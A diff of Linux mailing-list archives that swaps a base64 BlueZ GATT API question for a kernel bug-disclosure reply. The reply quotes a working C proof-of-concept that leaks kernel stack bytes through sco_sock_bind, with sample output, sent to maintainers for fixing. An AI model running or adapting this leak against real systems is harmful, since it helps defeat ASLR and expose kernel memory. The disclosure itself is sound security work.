@@ -1,62 +1,129 @@
-Return-Path: <linux-bluetooth-owner@vger.kernel.org>
-From: "Kasper Markus (ETAS-PSC/ECE1)" <Markus.Kasper@escrypt.com>
-To: "linux-bluetooth@vger.kernel.org" <linux-bluetooth@vger.kernel.org>
-Subject: DBUS GATT API via gio - Parsing results of GetManagedObjects fails  
-Date: Fri, 15 Jan 2016 12:24:42 +0000
-Message-ID: <6b9433067232482188eacf03ac09d44e@FE-MBX1011.de.bosch.com>
-Content-Type: text/plain; charset="utf-8"
+Return-Path: <dvyukov@google.com>
 MIME-Version: 1.0
-Sender: linux-bluetooth-owner@vger.kernel.org
+In-Reply-To: <1452846301.3416.5.camel@BR9GV9YG.de.ibm.com>
+References: <1452846301.3416.5.camel@BR9GV9YG.de.ibm.com>
+From: Dmitry Vyukov <dvyukov@google.com>
+Date: Fri, 15 Jan 2016 09:34:04 +0100
+Message-ID: <CACT4Y+YPbFYAD4EhC76e=pbHanXTXZLbohARqhGpkjyX0ugf4Q@mail.gmail.com>
+Subject: Re: [Fwd: Fw: Information leak in sco_sock_bind]
+To: syzkaller <syzkaller@googlegroups.com>
+Cc: Marcel Holtmann <marcel@holtmann.org>, Gustavo Padovan <gustavo@padovan.org>,
+	Johan Hedberg <johan.hedberg@gmail.com>, "David S. Miller" <davem@davemloft.net>,
+	linux-bluetooth@vger.kernel.org, netdev <netdev@vger.kernel.org>,
+	LKML <linux-kernel@vger.kernel.org>, Kostya Serebryany <kcc@google.com>,
+	Alexander Potapenko <glider@google.com>, Sasha Levin <sasha.levin@oracle.com>,
+	Eric Dumazet <edumazet@google.com>, Kees Cook <keescook@google.com>,
+	Hannes Frederic Sowa <hannes@stressinduktion.org>, <"Ursula Braun1/Germany/IBM"@de.ibm.com>,
+	linux-s390@vger.kernel.org,
+	Lauro Ramos Venancio <lauro.venancio@openbossa.org>,
+	Aloisio Almeida Jr <aloisio.almeida@openbossa.org>, Samuel Ortiz <sameo@linux.intel.com>
+Content-Type: text/plain; charset=UTF-8
 List-ID: <linux-bluetooth.vger.kernel.org>
 
-SGksDQoNCml0IHNlZW1zIEnigJhtIGFtb25nIHRoZSBmaXJzdCB1c2VycyBvdXQgdGhlcmUgdXNp
-bmcgdGhlIGRidXMgQVBJIGZvciBpbXBsZW1lbnRpbmcgYSBHQVRUIHNlcnZlciB2aWEgQyAmIGdp
-byAmIGdkYnVzLWNvZGVnZW4uIA0KU28gZmlyc3QgdGhhbmtzIHRvIEx1aXogZm9yIHRoZSByZWNl
-bnQgcGF0Y2ggYW5kIHRoZSBuZXcgZ3JlYXQgUmVnaXN0ZXJBcHAgQVBJLCB3aGljaCBzb2x2ZWQg
-c29tZSB0cm91YmxlIHdpdGggZ2lvIGFuZCB0aGUgY29udHJhZGljdGluZyBoaWVyYXJjaHkgcmVx
-dWlyZW1lbnRzIGZvciB0aGUgT2JqZWN0TWFuYWdlci4NCu+DqAlJ4oCZbSB1c2luZyBhIHJhdGhl
-ciByZWNlbnQgY2hlY2tvdXQgb2YgdGhlIGdpdC4NClVuZm9ydHVuYXRlbHkgSSByYW4gaW50byBh
-bm90aGVyIHByb2JsZW0gd2l0aCBkYnVzIGluY29tcGF0aWJpbGl0aWVzOiBXaGVuIHJlZ2lzdGVy
-aW5nIGFuIGFwcGxpY2F0aW9uIHRoZSBnZGJ1cy9jbGllbnQuYyBwYXJzZXMgdGhlIGludGVyZmFj
-ZXMgYW5kIGFkZHMgcHJveGllcyBiYXNlZCBvbiB0aGUgcmVzdWx0cyBvZiBhIEdldE1hbmFnZWRP
-YmplY3RzIGNhbGwuICANCg0KV2hhdCBoYXBwZW5zIGZvciBtZSBpcyB0aGF0IHRoZSBnaW8gaW1w
-bGVtZW50YXRpb24gZG9lcyBub3QgcmV0dXJuIHRoZSBvYmplY3RzIGluIHRoZSBvcmRlciBJIGFk
-ZGVkIHRoZW0sIGJ1dCBpbnN0ZWFkIChmb3Igd2hhdGV2ZXIgcmVhc29uKSBpbiBzb21lIG90aGVy
-IG9yZGVyLiBJbiBteSBjYXNlIEkgZ2V0IHRoZSBvcmRlciANCg0Kc2VydmljZTAvY2hhcjANCnNl
-cnZpY2UwDQpzZXJ2aWNlMC9jaGFyMQ0KDQpJbnN0ZWFkIG9mIA0KDQpzZXJ2aWNlMA0Kc2Vydmlj
-ZTAvY2hhcjANCnNlcnZpY2UwL2NoYXIxLg0KDQpXaGVuIHBhcnNpbmcvYWRkaW5nIGludGVyZmFj
-ZXMgdGhlIG9yZGVyIG9mIHRoZSBvYmplY3RzIHJldHVybmVkIGZyb20gdGhlIEdldE1hbmFnZWRP
-YmplY3RzIGNhbGwgaXMgcHJlc2VydmVkLiBUaHVzIGluc3RlYWQgb2YgZmlyc3QgYWRkaW5nIHRo
-ZSBzZXJ2aWNlIGFuZCB0aGVuIGFkZGluZyB0aGUgY2hhcmFjdGVyaXN0aWNzLCANCnRoZSBjdXJy
-ZW50IGltcGxlbWVudGF0aW9uIHN0YXJ0cyBhZGRpbmcgYSBjaGFyYWN0ZXJpc3RpYyBhbmQgdGhl
-biBmYWlscyByZWdpc3RlcmluZyB0aGUgc2VydmVyIGJlY2F1c2UgdGhlIGNvcnJlc3BvbmRpbmcg
-c2VydmljZSBpcyBzdGlsbCBtaXNzaW5nLiBJIGV4cGVjdCBzaW1pbGFyIGlzc3VlcyB3aXRoIOKA
-nG91dCBvZiBvcmRlcuKAnSBkZXNjcmlwdG9ycywgYnV0IGRpZCBub3QgdGVzdCBpdC4NCkkgYWxz
-byBkaWRu4oCZdCB0ZXN0IOKAnHNodWZmbGluZ+KAnSBvYmplY3RzIHdpdGhpbiB0aGUgUHl0aG9u
-IGV4YW1wbGUtZ2F0dC1zZXJ2ZXIsIGJ1dCB0aGlzIHNob3VsZCBtb3N0IGxpa2VseSBiZSB0aGUg
-ZmFzdGVzdCB3YXkgdG8gcmVwcm9kdWNlIHRoZSBwcm9ibGVtIGFuZCB0ZXN0IHNvbHV0aW9ucy4N
-CkF0IHRoZSBlbmQgb2YgdGhlIGRheSBmb3IgYmVzdCBpbnRlcm9wZXJhYmlsaXR5IEkgc3VnZ2Vz
-dCB0byBhdm9pZCByZWx5aW5nIG9uIHRoZSBvcmRlciBvZiB0aGUgR2V0TWFuYWdlZE9iamVjdHMg
-cmVwbHkgaW4gYmx1ZXosIGJ1dCBpbnN0ZWFkIGFpbSBmb3IgYSByb2J1c3QgcGFyc2luZy4gDQoN
-CknigJltIGFjdHVhbGx5IG5vdCBzdXJlIHdoYXQgd291bGQgYmUgdGhlIGJlc3QgcGxhY2UgYW5k
-IG1ldGhvZCB0byBmaXggdGhpcy4gUGF0Y2hpbmcgd2l0aGluIGdkYnVzL2NsaWVudC5jIHdvdWxk
-IGJlIHF1aXRlIGVhc3ksIGJ1dCBJIHRoaW5rIHRoZSBkYnVzIGltcGxlbWVudGF0aW9uIHNob3Vs
-ZG7igJl0IGNhcmUgYWJvdXQgYXBwbGljYXRpb24gcmVxdWlyZW1lbnRzLiBGaXhpbmcgd2l0aGlu
-IHRoZSBnYXR0LWRhdGFiYXNlLmMgd291bGQgbW9zdCBsaWtlbHkgYmUgYSBiaXQgY2xlYW5lciwg
-YnV0IHJlcXVpcmVzIChhdCBsZWFzdCBhdCBhIGZpcnN0IGdsYW5jZSkgbW92aW5nIHRvd2FyZHMg
-c29tZSBhcHByb2FjaCB3aGVyZSB3ZSBmaXJzdCByZWdpc3RlciBhbGwgaW50ZXJmYWNlcyBhbmQg
-aWdub3JlIGFsbCBlcnJvcnMsIGFuZCB0aGVuIGRvIGEgY29uc2lzdGVuY3kgY2hlY2sgb2YgdGhl
-IGhpZXJhcmNoeSBhZnRlcndhcmRzLCB3aGVuIGFsbCBpcyBkb25lLg0KDQpBbm90aGVyIHNtYWxs
-ZXIgaXNzdWUgSSBzdHVtYmxlZCB1cG9uIGlzIHRoZSByZXF1aXJlbWVudCB0byBjYWxsIFJlZ2lz
-dGVyQXBwbGljYXRpb24gYXN5bmNocm9ub3VzbHkgdG8gYWxsb3cgZm9yIGFuc3dlcmluZyB0aGUg
-Y2FsbHMgdG8gdGhlIG9iamVjdCBtYW5hZ2VyLiBXaGlsZSB0aGlzIG1pZ2h0IGJlIGEgbmF0dXJh
-bCB0aGluZyBmb3IgZXhwZXJpZW5jZWQgREJVUyBkZXZlbG9wZXJzIEkgZmVlbCBpdCB3b3VsZCBo
-ZWxwIGJlZ2lubmVycyB0byBtZW50aW9uIHRoaXMgd2l0aGluIHRoZSBkb2NzICg9IGl0IHdvdWxk
-IGhhdmUgc2F2ZWQgbWUgc29tZSBob3VycyBvZiBkZWJ1Z2dpbmcpLiANCg0KVGhhbmtzIGZvciB5
-b3VyIGdyZWF0IGVmZm9ydHMgb24gbWFpbnRhaW5pbmcgYW5kIGV4dGVuZGluZyBCbHVlei4NCg0K
-QnR3OiBpcyB0aGVyZSBhIGdvb2QgbW90aXZhdGlvbiBmb3IgdXNpbmcgc3RyaW5ncyBpbnN0ZWFk
-IG9mIGludGVyZ2Vycy9lbnVtcyB3aXRoaW4gdGhlIERCVVMgQVBJIChlLmcuIGZsYWdzKT8gSSBy
-ZWNlbnRseSByZWFkIGh0dHA6Ly9kYnVzLmZyZWVkZXNrdG9wLm9yZy9kb2MvZGJ1cy1hcGktZGVz
-aWduLmh0bWwgYW5kIHdvdWxkIGxvdmUgdG8gc2VlIHNvbWUgb2YgdGhlIHN1Z2dlc3Rpb25zIGJl
-aW5nIG1hcHBlZCB0byB0aGUgQVBJIGJlZm9yZSBpdCBsZWF2ZXMgZXhwZXJpbWVudGFsIHN0YXR1
-cy4NCg0KQ2hlZXJzLA0KTWFya3VzDQoNCg0K
+On Fri, Jan 15, 2016 at 9:25 AM, Ursula Braun <ubraun@linux.vnet.ibm.com> wrote:
+> Hi Dmitry,
+>
+> thx for mentioning iucv_sock_bind here. I will provide the equivalent
+> fix and add your name as "Reported-by" - if you do not object.
+
+I do not object.
+
+> Regards, Ursula Braun
+>
+> ----- Forwarded by Ursula Braun1/Germany/IBM on 15/01/2016 09:18 -----
+>
+> From:        Dmitry Vyukov <dvyukov@google.com>
+> To:        Marcel Holtmann <marcel@holtmann.org>, Gustavo Padovan
+> <gustavo@padovan.org>, Johan Hedberg <johan.hedberg@gmail.com>, "David
+> S. Miller" <davem@davemloft.net>, linux-bluetooth@vger.kernel.org,
+> netdev <netdev@vger.kernel.org>, LKML <linux-kernel@vger.kernel.org>,
+> syzkaller <syzkaller@googlegroups.com>, Kostya Serebryany
+> <kcc@google.com>, Alexander Potapenko <glider@google.com>, Sasha Levin
+> <sasha.levin@oracle.com>, Eric Dumazet <edumazet@google.com>, Kees Cook
+> <keescook@google.com>, Hannes Frederic Sowa
+> <hannes@stressinduktion.org>, Ursula Braun1/Germany/IBM@IBMDE,
+> linux-s390@vger.kernel.org, Lauro Ramos Venancio
+> <lauro.venancio@openbossa.org>, Aloisio Almeida Jr
+> <aloisio.almeida@openbossa.org>, Samuel Ortiz <sameo@linux.intel.com>,
+> Date:        15/12/2015 21:02
+> Subject:        Information leak in sco_sock_bind
+>
+> Hello,
+>
+> The following program leads to leak of 6 bytes from kernel stack:
+>
+> #include <sys/types.h>
+> #include <sys/socket.h>
+> #include <linux/in.h>
+> #include <linux/in6.h>
+> #include <linux/socket.h>
+> #include <linux/if.h>
+> #include <errno.h>
+> #include <stdio.h>
+> #include <string.h>
+> #include <unistd.h>
+> #include <sys/stat.h>
+> #include <fcntl.h>
+>
+> struct sockaddr_sco {
+> sa_family_t     sco_family;
+> char        sco_bdaddr[6];
+> };
+>
+> #define BTPROTO_SCO 2
+>
+> int main(void)
+> {
+>        struct sockaddr sa;
+>        struct sockaddr_sco sco_sa;
+>        unsigned len, i, try;
+>        int fd;
+>
+>        for (try = 0; try < 3; try++) {
+>                fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO);
+>                if (fd == -1)
+>                        return;
+>                switch (try) {
+>                case 0:
+>                break;
+>                case 1:
+>                sched_yield();
+>                break;
+>                case 2:
+>                open("/dev/null", O_RDONLY);
+>                }
+>                memset(&sco_sa, 0, sizeof(sco_sa));
+>                sco_sa.sco_family = AF_BLUETOOTH;
+>                bind(fd, &sco_sa, 2);
+>                len = sizeof(sa);
+>                getsockname(fd, &sa, &len);
+>                for (i = 0; i < len; i++)
+>                        printf("%02x", ((unsigned char*)&sa)[i]);
+>                printf("\n");
+>        }
+>        return 0;
+> }
+>
+> Output:
+> 1f00333e0088ffff
+> 1f00c13e0088ffff
+> 1f002081ffffffff
+>
+> The problem is that sco_sock_bind does not check sockaddr_len passed
+> in, so it copies stack garbage from stack into the socket. This can
+> defeat ASLR, leak crypto keys, etc.
+> We've just fixed a similar issue in pptp_bind. The similar issue is in
+> llcp_sock_bind and llcp_raw_sock_bind. And there seems to be the same
+> bug in iucv_sock_bind, it is S390 specific, so I can't test it.
+>
+> Kees proposed to zero unused part of sockaddr in SyS_bind/SyS_connect,
+> or add addr size to proto struct to prevent all such existing and
+> future bugs.
+>
+>
+>
+>
+> --
+> You received this message because you are subscribed to the Google Groups "syzkaller" group.
+> To unsubscribe from this group and stop receiving emails from it, send an email to syzkaller+unsubscribe@googlegroups.com.
+> For more options, visit https://groups.google.com/d/optout.
